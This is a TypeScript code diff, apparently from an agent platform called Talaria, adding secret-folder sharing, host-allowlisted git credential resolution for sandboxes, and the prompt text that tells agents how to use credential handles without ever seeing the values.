+  const rows = (await sql`select owner_user_id as "ownerUserId" from secret_folders where id = ${id}`) as unknown as Array<{ ownerUserId: string | null }>
+  if (rows.length === 0) return false
+  const owner = rows[0]!.ownerUserId
+  return owner === null ? isAdmin : owner === userId
+}
+
+export async function renameSecretFolder(id: string, name: string, userId: string, isAdmin = false): Promise<boolean> {
+  if (!(await ownsFolder(id, userId, isAdmin))) return false
+  const sql = await db()
+  await sql`update secret_folders set name = ${name} where id = ${id}`
+  return true
+}
+
+/** DELETING A FOLDER DOES NOT DELETE ITS CREDENTIALS. `on delete set null` puts
+ *  them back at the top level — losing four working keys because somebody tidied
+ *  up a label would be an unforgivable way to lose them. */
+export async function deleteSecretFolder(id: string, userId: string, isAdmin = false): Promise<boolean> {
+  if (!(await ownsFolder(id, userId, isAdmin))) return false
+  const sql = await db()
+  await sql`delete from secret_folders where id = ${id}`
+  return true
+}
+
+/** Share the whole folder — with a person who may then reveal everything in it,
+ *  or with an agent that may spend everything in it and read none of it. */
+export async function shareSecretFolder(
+  id: string,
+  who: { userId?: string; agentModel?: string },
+  on: boolean,
+  actingUserId: string,
+  isAdmin = false,
+): Promise<boolean> {
+  if (!(await ownsFolder(id, actingUserId, isAdmin))) return false
+  const sql = await db()
+  if (who.userId) {
+    if (on) await sql`insert into secret_folder_readers (folder_id, user_id, granted_by) values (${id}, ${who.userId}, ${actingUserId}) on conflict do nothing`
+    else await sql`delete from secret_folder_readers where folder_id = ${id} and user_id = ${who.userId}`
+    return true
+  }
+  if (who.agentModel) {
+    if (on)
+      await sql`insert into secret_folder_grants (folder_id, agent_model, granted_by) values (${id}, ${who.agentModel}, ${actingUserId}) on conflict do nothing`
+    else await sql`delete from secret_folder_grants where folder_id = ${id} and agent_model = ${who.agentModel}`
+    return true
+  }
+  return false
+}
+
+/** FILE IT SOMEWHERE. Owner-only, and the folder is an ARTIFACT folder on
+ *  purpose: a person organising their work wants "Checkout rewrite" to hold the
+ *  spec, the notes and the staging key, not to keep two parallel filing systems
+ *  whose names drift apart within a week.
+ *
+ *  What is emphatically NOT shared with artifacts is the STORAGE — a secret has
+ *  no body to index, export or serve. Only the shelf is common. */
+export async function moveSecretToFolder(name: string, folderId: string | null, actingUserId: string, isAdmin = false): Promise<boolean> {
+  const sql = await db()
+  const rows = (await sql`select id, owner_user_id as "ownerUserId", revealable from workspace_secrets where name = ${name}`) as unknown as Array<{
+    id: string
+    ownerUserId: string | null
+    revealable: boolean
+  }>
+  const doc = rows[0]
+  // A WORKSPACE credential (no owner, not revealable) is filed by an admin; a
+  // person's working secret is filed by that person. Both, and nothing else.
+  if (!doc) return false
+  const allowed = doc.revealable ? doc.ownerUserId === actingUserId : isAdmin && doc.ownerUserId === null
+  if (!allowed) return false
+  // Filing into somebody else's folder would share your credential with
+  // everyone THEY shared it with, which is not what "organise" means.
+  if (folderId !== null && !(await ownsFolder(folderId, actingUserId, isAdmin))) return false
+  await sql`update workspace_secrets set secret_folder_id = ${folderId} where id = ${doc.id}`
+  return true
+}
+
+/** The working secrets this person can see: theirs, plus what was shared with
+ *  them. Keys and labels only, like every other listing here. */
+export async function listSecretsForUser(userId: string): Promise<SecretDoc[]> {
+  const sql = await db()
+  const rows = (await sql`
+    select distinct s.name, s.created_at
+      from workspace_secrets s
+      left join workspace_secret_readers r on r.secret_id = s.id and r.user_id = ${userId}
+      left join secret_folder_readers fr on fr.folder_id = s.secret_folder_id and fr.user_id = ${userId}
+      left join secret_folders f on f.id = s.secret_folder_id
+     where s.revealable = true
+       and (s.owner_user_id = ${userId} or r.user_id is not null or fr.user_id is not null or f.owner_user_id = ${userId})
+     order by s.created_at desc
+  `) as unknown as Array<{ name: string }>
+  const out: SecretDoc[] = []
+  for (const r of rows) {
+    const doc = await getSecretDoc(r.name)
+    if (doc) out.push(doc)
+  }
+  return out
+}
+
+/** WHAT A HANDLE IN A CONVERSATION MEANS — the per-turn twin of the standing
+ *  soul line below.
+ *
+ *  A STANDING GRANT AND A RELAY ARRIVE DIFFERENTLY, so they are told differently.
+ *  A grant is a fact about the agent and belongs in its soul, rendered with the
+ *  rest of what it is. A relay is minted mid-conversation for one errand, and an
+ *  agent whose soul was written this morning has never heard of it — worse, an
+ *  agent granted NOTHING is told nothing at all, by design, so it has never
+ *  heard of handles either. Without this it would read `«secret:relay-…»` as a
+ *  typo and either paste it verbatim into a tool call and fail, or ask the human
+ *  to send the real value — which is precisely the paste this whole arrangement
+ *  exists to prevent. */
+export const HANDLE_TURN_NOTE =
+  'A handle written «secret:name» in this conversation is a credential you may USE without ever seeing it. ' +
+  'Pass it exactly as written wherever the value would go — in a tool call, a command, a URL — and Talaria substitutes the real value at the boundary that spends it. ' +
+  'Never ask anybody to send you the value instead, and do not treat the handle as a placeholder to fill in: it IS the credential as far as you are concerned. ' +
+  'A one-shot handle works once, so use it for the errand it was given for and nothing else.'
+
+/** THE BRIEFING ITSELF, over rows rather than over a database.
+ *
+ *  SPLIT OUT SO THE BENCHMARK CANNOT DRIFT FROM PRODUCTION. `fitness` grades
+ *  models on using handles correctly, and a fixture that briefed them with its
+ *  own hand-written paraphrase would be measuring a prompt no agent has ever
+ *  been given — the sweep would go green while the real soul line, worded
+ *  differently, failed. One definition, both callers: the agent reads this and
+ *  the eval hands the model this. */
+/** THE HANDLES A BRIEFING NAMES, as strings — the doc-only form for a
+ *  single-entry doc, the qualified form for a bundle.
+ *
+ *  ONE RULE, TWO READERS. `handleBriefing` renders these into the sentence an
+ *  agent reads, and the fitness fixtures assert the model wrote one of them.
+ *  Spelling that rule twice is how a benchmark comes to grade models against a
+ *  handle no agent was ever offered — which is exactly what happened here the
+ *  first time, and what this function exists to make impossible. */
+export function briefedHandles(rows: Array<{ name: string; key: string; label: string }>): string[] {
+  const byDoc = new Map<string, Array<{ key: string; label: string }>>()
+  for (const r of rows) byDoc.set(r.name, [...(byDoc.get(r.name) ?? []), { key: r.key, label: r.label }])
+  return [...byDoc].flatMap(([name, es]) => (es.length === 1 ? [handleFor(name)] : es.map((e) => handleFor(name, e.key))))
+}
+
+export function handleBriefing(rows: Array<{ name: string; key: string; label: string }>): string {
+  if (rows.length === 0) return ''
+  const byDoc = new Map<string, Array<{ key: string; label: string }>>()
+  for (const r of rows) byDoc.set(r.name, [...(byDoc.get(r.name) ?? []), { key: r.key, label: r.label }])
+  const lines = [...byDoc].map(([name, es]) =>
+    es.length === 1 && es[0] ? `${handleFor(name)} (${es[0].label})` : es.map((e) => `${handleFor(name, e.key)} (${e.label})`).join(', '),
+  )
+  return (
+    `Credentials you may USE without seeing: ${lines.join('; ')}. ` +
+    'Pass the handle exactly as written wherever the value would go — Talaria substitutes it at the boundary. ' +
+    'You will never be shown the value, and a handle you invent resolves to nothing.'
+  )
+}
+
+/** A CREDENTIAL FOR A HOST — the sandbox's way in, and the answer to the gap
+ *  handles could not otherwise cross.
+ *
+ *  THE PROBLEM THIS SOLVES. A handle substitutes at the MCP gateway, which is
+ *  every tool call an agent makes THROUGH TALARIA. It is not the shell inside a
+ *  workbench sandbox: a coding harness runs `git push` with its own bash tool,
+ *  Talaria is not in that path, and the handle goes out as literal text. That is
+ *  the single most common thing a workbench credential is for, so "handles work
+ *  everywhere except where you push code" is not a mechanism anybody can rely on.
+ *
+ *  So git asks US. A credential helper in the container receives the host git
+ *  wants a credential for, calls this over the agent's own key, and hands the
+ *  answer to git — which keeps it in process memory. The value never enters the
+ *  model's context, never appears in command output, and is never written down.
+ *  The model does not even have to know a credential was involved.
+ *
+ *  AN EMPTY ALLOWLIST IS NOT ELIGIBLE HERE, and that is the rule that makes this
+ *  safe rather than terrifying. Everywhere else an empty `allowed_hosts` means
+ *  "unrestricted", which is a reasonable default when a human wrote the handle
+ *  into a specific command. Here nobody wrote anything: git names a host and we
+ *  answer. Without the allowlist requirement, one grant would hand every
+ *  credential an agent holds to any host it could be pointed at — so a
+ *  credential reaches this path only if somebody said which hosts it is for. */
+export async function credentialForHost(
+  agentModel: string,
+  host: string,
+): Promise<{ username: string; password: string; name: string } | null> {
+  const sql = await db()
+  const lower = host.trim().toLowerCase()
+  if (!lower) return null
+  const rows = (await sql`
+    select s.id, s.name, s.title, coalesce(s.allowed_hosts, '{}') as "allowedHosts"
+      from workspace_secrets s
+      left join workspace_secret_grants g on g.secret_id = s.id and g.agent_model = ${agentModel}
+      left join secret_folder_grants fg on fg.folder_id = s.secret_folder_id and fg.agent_model = ${agentModel}
+     where (g.agent_model is not null or fg.agent_model is not null)
+       and array_length(s.allowed_hosts, 1) > 0
+       and (s.expires_at is null or s.expires_at > now())
+       and (s.uses_remaining is null or s.uses_remaining > 0)
+     order by s.title
+  `) as unknown as Array<{ id: string; name: string; title: string; allowedHosts: string[] }>
+
+  const doc = rows.find((r) => hostAllowed(lower, r.allowedHosts))
+  if (!doc) return null
+
+  const entries = (await sql`
+    select key, label, value_cipher as "cipher" from workspace_secret_entries where secret_id = ${doc.id} order by key
+  `) as unknown as Array<{ key: string; label: string; cipher: string }>
+
+  // TWO SHAPES, because credentials arrive in two shapes. A doc carrying
+  // `username` and `password` is a login; anything else is a token, and git
+  // takes a token as the PASSWORD with a throwaway username — the convention
+  // GitHub, GitLab and every registry already expect.
+  const named = (k: string) => entries.find((e) => e.key === k)
+  const userEntry = named('username') ?? named('user')
+  const passEntry = named('password') ?? named('token') ?? entries.find((e) => e !== userEntry)
+  if (!passEntry || passEntry.cipher === '') return null
+
+  let password: string
+  let username = 'x-access-token'
+  try {
+    password = open(passEntry.cipher)
+    if (userEntry && userEntry.cipher !== '') username = open(userEntry.cipher)
+  } catch {
+    return null
+  }
+
+  // SPEND IT, on the same terms as every other boundary — including burning a
+  // one-shot, which is exactly right: a relay handed to a sandbox for one push
+  // should not survive the push.
+  //
+  // THE HOST GOES INTO THE TEXT, and that is not cosmetic. `resolveHandles`
+  // reads the destination out of what it is substituting into, so a bare
+  // `«secret:name»` carries no host, fails the allowlist check it is supposed to
+  // pass, and refuses every credential this route exists to serve. Writing the
+  // URL git actually asked about makes the destination check verify the real
+  // thing rather than a synthetic string — the allowlist is enforced twice, by
+  // `hostAllowed` above and by the substitution itself.
+  // THE QUALIFIED HANDLE, not the bare one. A doc carrying `username` and
+  // `password` — the natural shape for a registry login — has two entries, and
+  // the bare form refuses as AMBIGUOUS by design. Spending it that way meant
+  // every username/password credential silently failed here while single-entry
+  // tokens worked, which is the kind of bug that looks like a flaky login.
+  const spent = await resolveHandles(`https://${lower}/ ${handleFor(doc.name, passEntry.key)}`, agentModel)
+  if (spent.used.length === 0) return null
+
+  void logAudit({
+    actor: agentModel,
+    action: 'secrets.spend',
+    targetType: 'secret',
+    targetId: doc.name,
+    targetLabel: passEntry.label,
+    after: { key: passEntry.key, hosts: [lower], via: 'git-credential', restricted: true },
+  })
+  return { username, password, name: doc.name }
+}
+
+/** WHAT THIS AGENT ACTUALLY HOLDS, structured — the same union `resolveHandles`
+ *  enforces, in a shape a UI can render.
+ *
+ *  `grantedHandlesFor` answers the same question as PROSE for a prompt, and
+ *  `SecretDoc.grants` answers only half of it: direct grants, missing everything
+ *  reaching the agent through a shared FOLDER. An admin looking at an agent's
+ *  page needs the whole truth, or the page says "no credentials" about an agent
+ *  that can spend four.
+ *
+ *  `via` is carried because revoking works differently for each: a direct grant
+ *  comes off the credential, a folder grant comes off the folder — and an admin
+ *  clicking revoke on something they cannot revoke from here is a worse outcome
+ *  than not offering the button. */
+export async function handlesHeldBy(agentModel: string): Promise<Array<{ name: string; title: string; key: string; label: string; via: 'direct' | 'folder'; folder: string | null }>> {
+  const sql = await db()
+  const rows = (await sql`
+    select s.name, s.title, e.key, e.label,
+           (g.agent_model is not null) as "direct",
+           f.name as "folder"
+      from workspace_secrets s
+      join workspace_secret_entries e on e.secret_id = s.id
+      left join workspace_secret_grants g on g.secret_id = s.id and g.agent_model = ${agentModel}
+      left join secret_folder_grants fg on fg.folder_id = s.secret_folder_id and fg.agent_model = ${agentModel}
+      left join secret_folders f on f.id = s.secret_folder_id
+     where (g.agent_model is not null or fg.agent_model is not null)
+       and (s.expires_at is null or s.expires_at > now())
+       and (s.uses_remaining is null or s.uses_remaining > 0)
+     order by s.title, e.key
+  `) as unknown as Array<{ name: string; title: string; key: string; label: string; direct: boolean; folder: string | null }>
+  return rows.map((r) => ({ name: r.name, title: r.title, key: r.key, label: r.label, via: r.direct ? 'direct' : 'folder', folder: r.folder }))
+}
+
+/** WHAT AN AGENT IS TOLD IT HAS — names and labels, never values.
+ *
+ *  This is the string a prompt can carry: it tells a model which handles exist
+ *  for it, so it can use one deliberately rather than inventing a name. A model
+ *  that has been granted nothing is told nothing, which is also correct. */
+export async function grantedHandlesFor(caller: string): Promise<string> {
+  const sql = await db()
+  const rows = (await sql`
+    select distinct s.name, e.key, e.label
+      from workspace_secrets s
+      join workspace_secret_entries e on e.secret_id = s.id
+      left join workspace_secret_grants g on g.secret_id = s.id and g.agent_model = ${caller}
+      left join secret_folder_grants fg on fg.folder_id = s.secret_folder_id and fg.agent_model = ${caller}
+     where (g.agent_model is not null or fg.agent_model is not null)
+       and (s.expires_at is null or s.expires_at > now())
+       and (s.uses_remaining is null or s.uses_remaining > 0)
+     order by s.name, e.key
+  `) as unknown as Array<{ name: string; key: string; label: string }>
+  return handleBriefing(rows)
+}
